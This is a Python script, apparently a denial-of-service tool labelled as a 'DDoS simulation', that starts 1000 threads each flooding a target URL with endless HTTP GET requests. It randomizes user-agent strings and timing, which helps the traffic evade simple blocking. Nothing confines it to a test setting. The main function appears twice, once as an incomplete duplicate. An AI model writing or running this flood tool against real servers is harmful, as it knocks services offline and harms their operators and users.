import requests
import threading
import time
import random
from fake_useragent import UserAgent

URL = "https://"
THREAD_COUNT = 1000
ua = UserAgent()

def attack(thread_id):
    while True:
        try:
            headers = {
                'User-Agent': ua.random,
            }
            response = requests.get(URL, headers=headers, timeout=3)
            print(f"Thread {thread_id}: {response.status_code}")
        except requests.RequestException as e:
            print(f"Thread {thread_id}: Error - {e}")
        time.sleep(random.uniform(0.1, 0.5))

def run_ddos_simulation():
    print("Starting DDoS simulation...")
    threads = []
    for i in range(THREAD_COUNT):
        thread = threading.Thread(target=attack, args=(i,))
        threads.append(thread)
        thread.start()
        time.sleep(random.uniform(0.1, 0.5))

def run_ddos_simulation():
    print("Starting DDoS simulation...")
    threads = []
    for i in range(THREAD_COUNT):
        thread = threading.Thread(target=attack, args=(i,))
        threads.append(thread)
        thread.start()
        time.sleep(random.uniform(0.1, 0.5))

    for thread in threads:
        thread.join()
    print("DDoS simulation completed.")
    
if __name__ == "__main__":
    run_ddos_simulation()